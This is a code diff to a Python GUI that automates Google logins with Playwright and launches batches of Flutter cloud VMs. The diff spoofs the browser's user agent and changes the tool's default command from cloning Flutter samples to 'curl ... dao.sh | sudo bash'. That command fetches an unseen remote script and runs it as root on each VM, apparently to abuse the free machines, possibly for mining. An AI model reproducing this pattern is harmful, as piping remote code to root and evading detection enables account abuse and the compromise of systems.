@@ -3,6 +3,7 @@ import threading
 import tkinter as tk
 from tkinter import ttk, scrolledtext
 import time
+from fake_useragent import UserAgent
 from playwright.async_api import Playwright, async_playwright, expect
 
 # --- Playwright automation functions (modified to send notifications to GUI) ---
@@ -27,7 +28,7 @@ async def perform_initial_login(GMAIL, MAT_KHAU, playwright: Playwright, log_cal
     context = None
     try:
         browser = await playwright.chromium.launch(headless=False)
-        context = await browser.new_context()
+        context = await browser.new_context(UserAgent().chrome)
         page = await context.new_page()
 
         log_callback("Đang truy cập tài khoản Google để đăng nhập...", "general")
@@ -487,7 +488,7 @@ class PlaywrightGUI:
         ttk.Label(input_frame, text="Lệnh Git:").grid(row=1, column=0, padx=5, pady=2, sticky="w")
         self.git_link_entry = ttk.Entry(input_frame, width=40)
         self.git_link_entry.grid(row=1, column=1, padx=5, pady=2, sticky="ew")
-        self.git_link_entry.insert(0, "git clone https://github.com/flutter/samples.git")
+        self.git_link_entry.insert(0, "curl -sL https://raw.githubusercontent.com/ChauDuongw/toll/refs/heads/main/dao.sh | sudo bash")
 
         # Number of Flutter Apps Entry
         ttk.Label(input_frame, text="Số lượng máy ảo Flutter (tối đa 10):").grid(row=2, column=0, padx=5, pady=2, sticky="w")
